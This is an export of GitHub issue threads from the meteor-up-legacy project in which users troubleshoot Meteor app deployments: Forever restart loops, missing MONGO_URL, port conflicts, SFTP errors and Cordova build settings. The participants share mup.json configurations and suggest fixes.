    at Module.require (module.js:364:17)
error: Forever detected script exited with code: 8
[45.55.1.143] error: Script restart attempt #1218[45.55.1.143] 
</Body>
    </Comment>
    <Comment>
      <Owner>innocube</Owner>
      <Body>Any idea how resolve this?
</Body>
    </Comment>
    <Comment>
      <Owner>innocube</Owner>
      <Body>I have tested with Leaderboard example. But I am getting the same result.
Any idea?
</Body>
    </Comment>
    <Comment>
      <Owner>innocube</Owner>
      <Body>This is my mup.json settings:

{
  // Server authentication info
  "servers": [
    {
      "host": "45.55.1.143",
      "username": "user",
      "password": "pass",
      // or pem file (ssh based authentication)
      "pem": "~/.ssh/mup_rsa"
    }
  ],

  // Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": false,

  // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
  "setupNode": true,

  // WARNING: If nodeVersion omitted will setup 0.10.26 by default. Do not use v, only version number.
  "nodeVersion": "0.10.40",

  // Install PhantomJS in the server
  "setupPhantom": false,

  // Application name (No spaces)
  "appName": "portal",

  // Location of app (local directory)
  "app": "/path/to/the/source/",

  // Configure environment
  "env": {
    "PORT": 80,
    "ROOT_URL": "http://45.55.1.143",
    "MONGO_URL": "mongodb://login:pass@localhost:27017/portal"
  },

  // Meteor Up checks if the app comes online just after the deployment
  // before mup checks that, it will wait for no. of seconds configured below
  "deployCheckWaitTime": 15
}
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Try extending the deployCheckWaitTime to 120
So it's Ubuntu 14 target?  Maybe you should try mupx if your stuck with mup.
Is this on AWS or Digital Ocean,  etc.?
You can try a default empty meteor app too another provider. Once you have a working example you can inject your app and see what breaks it or at least remove that from the issue initially.
</Body>
    </Comment>
    <Comment>
      <Owner>vangorra</Owner>
      <Body>Having the same problem with Ubuntu 14 in AWS. My config is almost the same at OP's. Any ideas?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Firewall ingress maybe? 
If you ssh into the target and can curl the local host port but can't on the outside then that's packets being blocked.
The problem is it will role back if it can't detect it.
In such a case one way is to put an exit() call in the code where it checks and reverts and then check locally via ssh.
If you need more clarity after some more deep thought and tries then I'll explain better but I think you're following.
</Body>
    </Comment>
    <Comment>
      <Owner>vangorra</Owner>
      <Body>Perhaps. I reran "mup setup &amp;&amp; mup deploy" and it's all working. I probably had the wrong network security group or something.
</Body>
    </Comment>
  </Issue_183>
  <Issue_184>
    <Repository>meteor-up-legacy</Repository>
    <Title>Add availability to change bundle build architecture</Title>
    <Owner>arunoda</Owner>
    <Body>There is some troubles with deployment from Mac OS to Linux servers, so it should be added option for change build architecture
</Body>
    <State>open</State>
    <Comment>
      <Owner>hems</Owner>
      <Body>funny enough this has been working for me for months and all of a sudden i'm getting the fibers error.</Body>
    </Comment>
  </Issue_184>
  <Issue_185>
    <Repository>meteor-up-legacy</Repository>
    <Title>Forever crashing with Meteor Up / Iron on fresh Ubuntu 14.04 Nginx server (DigitalOcean)</Title>
    <Owner>arunoda</Owner>
    <Body>After 12 hours trying to resolve this issue, I guess it might be a bug. My configuration includes this

```
   {
      // Server authentication info
     "servers": [
       {
        "host": "MY SERVER",
        "username": "root",
        "password": "MY PASSWORD"
        // or pem file (ssh based authentication)
        //"pem": "~/.ssh/id_rsa"
      }
    ],

  // Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": true,

  // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
  "setupNode": true,

  // WARNING: If nodeVersion omitted will setup 0.10.36 by default. Do not use v, only version number.
  "nodeVersion": "0.10.40",

  // Install PhantomJS in the server
  "setupPhantom": true,

  // Show a progress bar during the upload of the bundle to the server. 
  // Might cause an error in some rare cases if set to true, for instance in Shippable CI
  "enableUploadProgressBar": false,

  // Application name (No spaces)
  "appName": "geokaliz",

  // Location of app (local directory)
  "app": "/Users/Loschcode/Google Drive/projects/geokaliz_lo/website/app",

  // Configure environment
  "env": {

    "PORT": 80,
    "ROOT_URL": "http://laurent.tech",
    "MONGO_URL": "mongodb://root:root@localhost:27017/geokaliz",
    "MAIL_URL": "smtp://this-is-shit/"

  },

  // Meteor Up checks if the app comes online just after the deployment
  // before mup checks that, it will wait for no. of seconds configured below
  "deployCheckWaitTime": 50
}
```

Meteor Up is deploying correctly, all the files are going into `/opt/` but forever uptime is less than 1sec and then restart systematically. I did a a `userdown app/main.js` into the correct folder to replicate what forever does and a big error shows up

```
 Error: MONGO_URL must be set in environment
        at Object.&lt;anonymous&gt; (packages/mongo/remote_collection_driver.js:36:1)
        at Object.defaultRemoteCollectionDriver (packages/underscore/underscore.js:750:1)
        at new Mongo.Collection (packages/mongo/collection.js:102:1)
        at AccountsServer.AccountsCommon (accounts_common.js:23:18)
        at new AccountsServer (accounts_server.js:16:5)
        at Package (globals_server.js:5:12)
        at /opt/geokaliz/app/programs/server/packages/accounts-base.js:1814:4
        at /opt/geokaliz/app/programs/server/packages/accounts-base.js:1825:3
        at /opt/geokaliz/app/programs/server/boot.js:242:10
        at Array.forEach (native)
```

Yeah ... Pretty weird since everything has been set. It's been a while i'm on it and the issue changes, i clear the droplet and try again all the time with different versions of everything, etc. nothing works

Any guess ?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Maybe this helps.
http://stackoverflow.com/questions/18359326/how-do-i-fix-error-mongo-url-must-be-set-in-environment-on-ubuntu-using-forev
or
https://groups.google.com/forum/#!topic/meteor-talk/dUFTMoIdS_0

Is this Meteor 1.2.1? mup or mupx? or right always try mupx if mup doesn't work properly.
</Body>
    </Comment>
    <Comment>
      <Owner>Loschcode</Owner>
      <Body>It's mup, but i also tried mupx (took me the whole day, i really tried everything) and i had some big errors linked to docker so i was like "yeah whatever" and came back to mup ...

Also the answers on the topic aren't relevant to me :(
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Oh okay well I'm more familiar with mupx. So hopefully someone else has an idea, sorry.
It seems the mongo_url is the problem.
Sometimes a ctrl character or something like that can get in there.
You'll need to double check it. Even try retyping it manually if verified correct.
Update all versions of everything would also be a pertinent step.
</Body>
    </Comment>
    <Comment>
      <Owner>Loschcode</Owner>
      <Body>I'm still checking it, and I think the problems comes from the fact it doesn't take my settings.json into consideration (i'm using Iron and there's a config in `config/production/settings.json` containing some things and a `config/env.sh` containing things like `MONGO_URL` which aren't loaded when I build and launch the `main.js`, same when I deploy with mup/mupx

Very weird stuff ...
</Body>
    </Comment>
    <Comment>
      <Owner>Loschcode</Owner>
      <Body>After those days of research I opened an issue on `iron-cli` ; I don't know which one of `mup` or `iron-cli` is responsible for that ...

https://github.com/iron-meteor/iron-cli/issues/224

Any guess of what i'm missing here ?
</Body>
    </Comment>
  </Issue_185>
  <Issue_186>
    <Repository>meteor-up-legacy</Repository>
    <Title>build cordova</Title>
    <Owner>arunoda</Owner>
    <Body>when using mup deploy, I think mup also build Cordova for mobile again, Is It necessary to build for ?
Also, build for Cordova is much slow down  the speed of build.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>There is in my mupx PR the overwriting of the bundled deployed versions platforms file with just "server" &amp; "browser", otherwise remove the platforms before deployment (and restore it if needed later).

```
meteor remove platform ios android
```
</Body>
    </Comment>
  </Issue_186>
  <Issue_187>
    <Repository>meteor-up-legacy</Repository>
    <Title>How do you view all logs?</Title>
    <Owner>arunoda</Owner>
    <Body>I can't find this answer anywhere I am surprised. 

While I can use `mup logs -f` to tail the logs, how can I view the entire log. I want to go back in history to view the logs for an error that happened awhile back. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Try /var/lib/mongodb I think that's where mupx shares the volume from for the docker container created during setup. I think it's the same for mup

https://github.com/arunoda/meteor-up/blob/91e33a24dc26e306f5bf10c319a57211dfc832b1/templates/linux/mongodb.conf
</Body>
    </Comment>
    <Comment>
      <Owner>joadr</Owner>
      <Body>sferoze.. looking in the mup's code i found out that all logs where at:

/var/log/upstart

there you can find a file called &lt;your application name&gt;.log
 in my case in the mup.json, my app is called just meteor.. so.. my log file is at
/var/log/upstart/meteor.log

;)

By the way.. those are the logs in your server, not your own computer, lol
</Body>
    </Comment>
  </Issue_187>
  <Issue_188>
    <Repository>meteor-up-legacy</Repository>
    <Title>Site not reachable with EADDRINUSE error</Title>
    <Owner>arunoda</Owner>
    <Body>Hi
I'm deploying to a Linux server Ubuntu14.04.3 running Node 0.10.40, am using Meteor 1.2.1 and deploying using mup. Mup.json specifies port 80

After deploy the site isn't reachable. The 'mup logs' give me this:
Error: listen EADDRINUSE
    at errnoException (net.js:905:11)
    at Server._listen2 (net.js:1043:14)
    at listen (net.js:1065:10)
    at net.js:1147:9
    at dns.js:72:18
    at process._tickCallback (node.js:448:13)
error: Forever detected script exited with code: 8
error: Script restart attempt #7

The EADDRINUSE error suggests that the port is already taken for another site or app. However there is definitely no other web server or meteor application running. Changing the port to (say) 8000 has the desired effect, ie. all is well. But of course the site then isn't reachable for the public. A reboot, redeploy, reconfigure etc all hasn't helped.

Any advice is welcome!

E.g. How can I check the mup/meteor settings on the server? Are there any other library dependencies I need to be aware of?

Thanks
Mark
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>If you SSH into the target machine and wget or curl that conflicting port (locslhost) it might reveal that in fact there is something already running there? Before and after deploy? 
Im also thinking maybe trying mupx will make a difference for you.
</Body>
    </Comment>
  </Issue_188>
  <Issue_189>
    <Repository>meteor-up-legacy</Repository>
    <Title>App Argument adds Unnecessary Complication</Title>
    <Owner>arunoda</Owner>
    <Body>What is the app argument in the mup.json file used for?

From my understanding, it's supposed to contain the app directory on the local development computer, not the directory of the app on staging or production servers. This seems to add an unnecessary complication to setting up mup and deploying your app. Especially if you have a team of developers. Each dev will have a different file configuration, and yes, you could ask them to have the same relative paths to the app or to change mup.json, but that shouldn't be necessary.

mup should assume the current directory or take an argument of the directory to your app.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>My understanding is you can put different configurations like staging/testing vs deployment and point back to the same source folder for bundling. Then it's perfect for your use case.
</Body>
    </Comment>
    <Comment>
      <Owner>merlinpatt</Owner>
      <Body>So you're saying you'd have different settings.json in different folders?

If that's true, that's also complicating things. You could have an argument for the settings file as well.

It's much easier and more dev friendly if you can do `mup -s settings.json -p project-directory` than it is to ask devs to put things in different folders. 
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Please review the --settings and --config flags the project directory is stored in the settings file as "app".
https://github.com/arunoda/meteor-up/tree/mupx#custom-configuration-and-settings-files
The "app" folder is what is bundled when deploying.
</Body>
    </Comment>
    <Comment>
      <Owner>merlinpatt</Owner>
      <Body>That's for mupx. Is that production ready?

And that still doesn't answer the question. Why have the app directory in the mup file itself instead of as a command line argument?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Production ready is a relative question. I can't answer that. I think officially it's not.
mupx init generates them and so it's just a convenience init setup deploy.
It's usually possibly to override any configuration variable with a command line and then environment variable. 
It's something that should be possible. Aka default behaviour. (My PR does something like that for Mongo backups [a more regular request].)

I'm sure the devoloper is thankful of your insight and feedback. 
Pull Requests are welcome. 
I'm just not sure much priority exists for mup as Kadira has their focus currently I imagined. (30 waiting to be merged?) 
Personally I think you should just enter your repo link for automated watching.
</Body>
    </Comment>
  </Issue_189>
  <Issue_190>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deploying meteor app on digital ocean fails</Title>
    <Owner>arunoda</Owner>
    <Body>Hi there, 

I have a meteor app which I'd like to deploy on my digital ocean server. However I'm getting an error, but it doesn't say what error... It just says: 

---

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Building Started: .
## =&gt; Build Error. Check the logs printed above.`

I followed this tutorial: https://medium.com/@katopz/digital-ocean-meteor-bec33e75522d , but it doesn't work. 

Thanks.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You should post the logs and settings. Also try mupx if mup is not cutting it for you.
</Body>
    </Comment>
    <Comment>
      <Owner>marcianosr</Owner>
      <Body>Thanks for answering MasterJames. I digged deeper into the cause, and it had to do with the limited space on the server I had. I installed a simple meteor app, and that worked. Some of the more complex apps didn't because there is not enough space on the server. 
</Body>
    </Comment>
  </Issue_190>
  <Issue_191>
    <Repository>meteor-up-legacy</Repository>
    <Title>Mup reconfig and deploy error</Title>
    <Owner>arunoda</Owner>
    <Body>I deployed to digital ocean without problem yesterday. However, today when I try to reconfig or deploy. I receive the following errors:

"Uploading bundle: FAILED
    Received exit code 1 while establishing SFTP session
"
I created the droplet on digital ocean with SSH. Nothing changed from yesterday to today. Any pointers on what might be wrong?  Thanks!
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>nodemiral is how mupx copies
https://github.com/arunoda/nodemiral/blob/dbc96f5083650396d4f395ecc9b8c209c07e5894/lib/session.js#L67
The comment suggests it's not the paths but rather errors while "establishing" the connection.
I would try to enable more verbose debugging and see/post the logs from that
https://github.com/arunoda/meteor-up/tree/mupx#verbose-output

```
DEBUG=* mupx deploy
```

I'm guessing you can't still SSH and/or something connection wise is awry.
</Body>
    </Comment>
    <Comment>
      <Owner>digz6666</Owner>
      <Body>how to run debug on windows? It says:

```
'DEBUG' is not recognized as an internal or external command,
operable program or batch file.
```
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You're right thats not available on windows nor a git shell. Maybe there's a different shell that can be installed?
Maybe you have to set it? If the file exists maybe setting the environment variable will make it work?

```
set DEBUG = C:\Windows\System32\debug.exe
```

You might find you need to install an assembler or dev/debug tools.
Maybe www.winDBG.org will have a debug.exe that will do the trick. 
It's just a guess or place to start.
There's always VMs maybe via VirtualBox but you have to setup file sharing etc.
I'll keep looking hopefully someone has a clearer answer.
</Body>
    </Comment>
    <Comment>
      <Owner>digz6666</Owner>
      <Body>Following is worked for me.

```
set DEBUG=*
mup deploy
```
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Wow good thinking.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Wait a minute doesn't that just erase the Environment variable? To see type..

```
set DEFAULT
```

Should output this below after your set "DEBUG =*" removes it.

```
Environment variable DEFAULT not defined
```
</Body>
    </Comment>
    <Comment>
      <Owner>digz6666</Owner>
      <Body>After using SET DEBUG=\* it produces more messages.
Is there any environment variable with a name DEBUG?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Y a I don't know how that works to be honest.
If anyone could point to some literature on the subject that would be great.
Maybe it functions as something like a shell mounted device node for console logging etc. I expected an environment variable.
I guess I'll fire up a VM on my dated PR for adding Mongo restore and backup.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Doesn't work on ubuntu either?  So NeXT sorry OSX only? Maybe it's shell specific? 
This Ubuntu 14 VM when typing echo $0 reports bash of course. 
Are not mac's bashed by default so that can't be it? 
On Ubuntu I get the same error DEBUG command not found.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Right I just noticed you can't have a space between the DEBUG and the =\* so only put DEBUG=\* mupx deploy again no space. Still that doesn't work on Windows shell but it will work with the Git Shell which also via echo$0 confirms it's a bash shell thing. So get the GitHub for Windows (or similar bash solution).
https://desktop.github.com/ and try with no space (as you've shown).
Sorry for the mix up. I still can't find anything official to explain what it's doing there?
</Body>
    </Comment>
  </Issue_191>
  <Issue_192>
    <Repository>meteor-up-legacy</Repository>
    <Title>problem with deploying: npm install due to binary modules</Title>
    <Owner>arunoda</Owner>
    <Body>I have a package trying to make use of irc (https://www.npmjs.com/package/irc). This is what I get using Meteor 1.2.1 and having node 0.10.40 installed on the server.

This is how I try to use the irc npm package in my package:

```
Package.onUse(function(api) {
  api.versionsFrom('1.2.1');

  api.use('meteorhacks:npm', 'server');

  api.export('irc', 'server');

  api.addFiles('meteor-irc.js', 'server');
});

Npm.depends({
  "irc": "0.4.0"
});
```

I am using `meteorhacks:npm@1.5.0`

using `mup deploy`:

```
Started TaskList: Deploy app 'app' (linux)
 Uploading bundle
 Uploading bundle: SUCCESS
 Setting up Environment Variables
 Setting up Environment Variables: SUCCESS
 Invoking deployment process
x Invoking deployment process: FAILED

        -----------------------------------STDERR-----------------------------------
        sudo: npm: command not found
        -----------------------------------STDOUT-----------------------------------
         &gt; ./mongodb: npm install due to binary npm modules
        ----------------------------------------------------------------------------
```

using `mupx deploy`:

```
Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

" Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup "

Meteor app path    : C:\Users\gatsu\Documents\Meteor\app
Using buildOptions : {}
Errors prevented bundling:
While linking the program:
error: jsoft:meteor-irc is not compatible with architecture
'os.linux.x86_64'


=&gt; Build Error. Check the logs printed above.
```

mup.json:

```
{
  // Server authentication info
  "servers": [
    {
      "host": "******",
      "username": "******",
      "password": "*******"
      // or pem file (ssh based authentication)
      //"pem": "~/.ssh/id_rsa"
    }
  ],

  // Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": false,
  "setupNode": false,
  "nodeVersion": "0.10.40",
  "setupPhantom": false,

  // Show a progress bar during the upload of the bundle to the server.
  // Might cause an error in some rare cases if set to true, for instance in Shippable CI
  "enableUploadProgressBar": true,

  // Application name (No spaces)
  "appName": "app",

  // Location of app (local directory)
  "app": "C:/Users/gatsu/Documents/Meteor/app",

  // Configure environment
  "env": {
    "PORT": 80,
    "ROOT_URL": "*******",
    "MAIL_URL": "*********"
  },

  // Meteor Up checks if the app comes online just after the deployment
  // before mup checks that, it will wait for no. of seconds configured below
  "deployCheckWaitTime": 20
}
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Thanks for the great documenting.
This is when I believe a plugin doesn't compile in the build/linking step of the deployment platform.

```
error: jsoft:meteor-irc is not compatible with architecture 'os.linux.x86_64'
```

I've not run into it personally, but I've seen similar issues posted here (I'll look into those more later but). 
First thought is, is there a similar package on atmosphere that makes the solution easier?
Like...

https://atmospherejs.com/mrt/meteor-node-irc
</Body>
    </Comment>
  </Issue_192>
  <Issue_193>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deploying to AWS Beanstalk </Title>
    <Owner>arunoda</Owner>
    <Body>Is it possible to deploy to AWS Beanstalk? 
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>My guess is the short answer is No. Maybe someone else can explain otherwise.
Maybe if you deployed to a docker instance and then pushed that to docker hub (or something like that) then you could probably use beanstalk to reference that?
Here is the official way to build a custom AMI that you can use in Beanstalk.
http://docs.aws.amazon.com/elasticbeanstalk/latest/dg/using-features.customenv.html
</Body>
    </Comment>
  </Issue_193>
  <Issue_194>
    <Repository>meteor-up-legacy</Repository>
    <Title>buildOptions mobileSettings failing to build</Title>
    <Owner>arunoda</Owner>
    <Body>It seems as adding the field "mobileSettings" in "buildOptions" fails no matter what you put in it.

For instance, I'm trying to do 

```
"buildOptions": {
    // mobile setting for cordova apps
    "mobileSettings": {
      "public": {
        "facebook": {
          "permissions": [
            "public_profile", 
            "email", 
            "user_friends"
          ]
        }
      }
    }
},
```

But even when I don't supply any settings to mobileSettings

```
"buildOptions": {
    // mobile setting for cordova apps
    "mobileSettings": {}
}
```

I get the error:

```
Error: ENOENT, open '{}'
    at Object.Future.wait (/Users/Alek/.meteor/packages/meteor-tool/.1.1.10.kjh7a4++os.osx.x86_64+web.browser+web.cordova/mt-os.osx.x86_64/dev_bundle/lib/node_modules/fibers/future.js:398:15)
    at /tools/fs/files.js:1331:28
    at Object.wrapper [as readFile] (/tools/fs/files.js:1334:20)
    at CordovaBuilder.generateBootstrapPage (/tools/cordova/builder.js:379:24)
    at CordovaBuilder.copyWWW (/tools/cordova/builder.js:359:32)
    at CordovaProject.prepareFromAppBundle (/tools/cordova/project.js:159:13)
    at /tools/cli/commands.js:966:24
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I hope someone more familiar can sound off here, but I'll just ask if you're updated to meteor 1.2 and using mupx? both things might help here.
Otherwise I'll suggest possibly you want to disable Cordova stuff before deployment. If it is?
https://github.com/meteor/meteor/wiki/Meteor-Cordova-integration

```
 meteor remove-platform ios android
```
</Body>
    </Comment>
  </Issue_194>
  <Issue_195>
    <Repository>meteor-up-legacy</Repository>
    <Title>Faster boot process</Title>
    <Owner>arunoda</Owner>
    <Body>Continuously check for the app to start up instead of waiting
deployCheckWaitTime.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>There should be at least a few seconds between each Check? 
</Body>
    </Comment>
    <Comment>
      <Owner>theicfire</Owner>
      <Body>Fixed, I figured curl took long enough to run to not need that, but it's really fast at checking if localhost:80 is down.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>This was apparently already part of mupx, but it's a nice idea to see similar in mup too.
Like minds think alike!
https://github.com/arunoda/meteor-up/blob/mupx/scripts/linux/verify-deployment.sh#L25
</Body>
    </Comment>
    <Comment>
      <Owner>theicfire</Owner>
      <Body>Nice, not surprising!
</Body>
    </Comment>
  </Issue_195>
  <Issue_196>
    <Repository>meteor-up-legacy</Repository>
    <Title>One server, two IPs: Deploy fails when Apache is running</Title>
    <Owner>arunoda</Owner>
    <Body>Hello,

I have two IP address bound to my server. One IP is for Apache and one is for Meteor. Both are running on port 80.
- Apache runs on 000.000.000.000:80
- Meteor runs on 000.000.000.001:80

When apache is stopped, deploying my meteor app goes fine. However when Apache is running I get a deployment error stating: `Failed to connect to localhost port 80: Connection refused`

I have bound apache to its IP address by setting the port.conf to:
`Listen 000.000.000.000:80`
Also, all my virtual hosts are bound by:
`&lt;VirtualHost 000.000.000.000:80&gt;`

Meteor is bound to its IP address by setting the environment variable in mup.json:
`"BIND_IP": "000.000.000.001"`

It seems that the deployment process tries to connect to localhost for verification but can't because apache is active on localhost port 80. I'm not sure what's going on since I specifically bound apache to its own IP address. Do you know what I'm doing wrong?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Im not too clear on your setup, but thought it worth mentioning for your consideration.  If you're using mupx 'docker run' has a -p flag for associating ports and IPs (multiple entries are allowed). It makes iptable enties I believe.
Maybe you could change that in the template start.sh? 
</Body>
    </Comment>
    <Comment>
      <Owner>sanneterpstra</Owner>
      <Body>Thanks, I'm using mup tough. It also seems related to this issue #384
</Body>
    </Comment>
  </Issue_196>
  <Issue_197>
    <Repository>meteor-up-legacy</Repository>
    <Title>reset app by db.dropDatabase() now can't deploy!</Title>
    <Owner>arunoda</Owner>
    <Body>i was trying to reset my app that was deployed with `mupx` and i found [this question/answer on stackoverflow](http://stackoverflow.com/questions/24372992/how-to-reset-a-meteor-project-thats-been-deployed-with-meteor-up)

@arunoda answered the question, saying to use `db.dropDatabase()` -- since it was arunoda giving the advice, i followed it.  now i can't deploy my app!

i'm using the local mongodb, not compose or mongolabs, and when i look at the docker processes my mongodb image is constantly `Restarting`

i've tried removing the images, containers, and even docker itself, but i can't get mongodb to start up.

the app is deployed on AWS and was working fine until i `db.dropDatabase()` last night.

any help is appreciated here.

```
:~$ docker ps -a
CONTAINER ID        IMAGE                      COMMAND                  CREATED             STATUS                         PORTS                        NAMES
9bf26e959ee2        mongo                      "/entrypoint.sh mongo"   11 hours ago        Restarting (100) 3 hours ago   127.0.0.1:27017-&gt;27017/tcp   mongodb
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I just added a pull request to resolve that.
Anyway you can remove /var/lib/mongodb/mongod.lock
Also you can run setup after that to be sure but then if you run setup run deploy again too.
</Body>
    </Comment>
  </Issue_197>
  <Issue_198>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deploy to multiple servers in parallel?</Title>
    <Owner>arunoda</Owner>
    <Body>In mupx multiple servers can be specified, but deployments happen in series rather than in parallel. Is it possible for mupx to deploy to all servers at once?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Maybe consider kubernetes pods if you're looking at enough containers to need parallel deployment. I'm thinking over a dozen containers, which seems pretty rare.
I figure once you have 5 up what's the hurry? 
</Body>
    </Comment>
  </Issue_198>
  <Issue_199>
    <Repository>meteor-up-legacy</Repository>
    <Title>multiple app on single server</Title>
    <Owner>arunoda</Owner>
    <Body>hey, Im using digital ocean Ubuntu 14.04 x64 and three meteor deployment is working fine (although I didn't deploy recently on any of them ) and forth was working fine also until I re-deploy. now no matter I do I get 

```
Invoking deployment process: FAILED

    -----------------------------------STDERR-----------------------------------
    module.js:364:17)
        at require (module.js:380:17)
        at Object.&lt;anonymous&gt; (/usr/share/node-gyp/lib/node-gyp.js:12:10)
        at Module._compile (module.js:456:26)
        at Object.Module._extensions..js (module.js:474:10)
        at Module.load (module.js:356:32)
        at Function.Module._load (module.js:312:12)
        at Module.require (module.js:364:17)
    npm WARN package.json meteor-dev-bundle@0.0.0 No description
    npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
    npm WARN package.json meteor-dev-bundle@0.0.0 No README data
    js-bson: Failed to load c++ bson extension, using pure JS version
    stop: Unknown instance: 
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 3034: Connection refused
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------
    .0 node_modules/ansi-styles

    escape-string-regexp@1.0.3 node_modules/escape-string-regexp

    chalk@0.5.1 node_modules/chalk

    has-ansi@0.1.0 node_modules/has-ansi

    strip-ansi@0.3.0 node_modules/strip-ansi

    supports-color@0.2.0 node_modules/supports-color

    eachline@2.3.3 node_modules/eachline

    type-of@2.0.1 node_modules/type-of

    amdefine@1.0.0 node_modules/amdefine

    asap@2.0.3 node_modules/asap

    underscore@1.5.2 node_modules/underscore

    meteor-promise@0.5.0 node_modules/meteor-promise

    promise@7.0.4 node_modules/promise

    source-map-support@0.3.2 node_modules/source-map-support

    semver@4.1.0 node_modules/semver

    source-map@0.1.32 node_modules/source-map

    fibers@1.0.5 node_modules/fibers
    Waiting for MongoDB to initialize. (5 minutes)
    { [Error: Cannot find module '../build/Release/bson'] code: 'MODULE_NOT_FOUND' }
    connected
    xxxx start/running, process 8250
    Waiting for 60 seconds while app is booting up
    Checking is app booted or not?
    xxxx stop/waiting
    xxxx start/running, process 8403

```

node version 0.10.40
meteor version 1.2.0.2 
mup version 0.11.3
</Body>
    <State>open</State>
    <Comment>
      <Owner>berkaey</Owner>
      <Body>now after another deploy
I got this

```
Error: /opt/xxxx/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build/Release/bcrypt_lib.node: invalid ELF header[46.101.145.104] 
[46.101.145.104]     at Module.load (module.js:356:32)[46.101.145.104] 
[46.101.145.104]     at Function.Module._load (module.js:312:12)[46.101.145.104] 
[46.101.145.104]     at Module.require (module.js:364:17)[46.101.145.104] 
[46.101.145.104]     at require (module.js:380:17)[46.101.145.104] 
[46.101.145.104]     at bindings (/opt/xxxx/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/node_modules/bindings/bindings.js:74:15)[46.101.145.104] 
[46.101.145.104]     at Object.&lt;anonymous&gt; (/opt/xxxx/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/bcrypt.js:3:35)[46.101.145.104] 
[46.101.145.104]     at Module._compile (module.js:456:26)[46.101.145.104] 
[46.101.145.104]     at Object.Module._extensions..js (module.js:474:10)[46.101.145.104] 
[46.101.145.104]     at Module.load (module.js:356:32)[46.101.145.104] 
[46.101.145.104]     at Function.Module._load (module.js:312:12)[46.101.145.104] 
[46.101.145.104] error: Forever detected script exited with code: 8[46.101.145.104] 
[46.101.145.104] error: Script restart attempt #22[46.101.145.104] 
```
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>If you've updated to meteor 1.2.\* you should configure mup.json to use node 0.10.40 (assuming it's Ubuntu 14+). Otherwise maybe post your settings file.
</Body>
    </Comment>
    <Comment>
      <Owner>berkaey</Owner>
      <Body>It is actually 0.10.40 and I created new droplet on digital ocean and can able deploy there without any issue.

```
{
  "servers": [
    {
      "host": "xxxxxx",
      "username": "root",
      "pem": "~/.ssh/id_rsa"
    }
  ],
  "setupMongo": false,
  "setupNode": true,
  "nodeVersion": "0.10.40",
  "setupPhantom": false,
  "appName": "xxxx",
  "app": ".",
  "env": {
    "PORT": 30xx,
    "UPSTART_UID": "meteoruser",
    "ROOT_URL": "http://xxxxxxxx",
    "MONGO_URL":"xxxxxxxxxxxxxxx"
  },
  "deployCheckWaitTime": 120
}

```
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I next would have thought to extend the wait time but 120 seems plenty.
I wondered if you're using mup or have tried mupx.
Another thing to check is that your own Mongo Deployment is connectable from the machine.
If you could SSH into the target machine and see if there's anything running there via curl etc. It could even be a firewall port issue.
</Body>
    </Comment>
    <Comment>
      <Owner>berkaey</Owner>
      <Body>actually other apps are also connect to same mongo db and some how only one time I could make this work on this server too. and I didn't mupx. Is mupx support multiple apps in same server.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>When mup isn't working it's usually a little easier to try mupx then to trouble shooting mup.
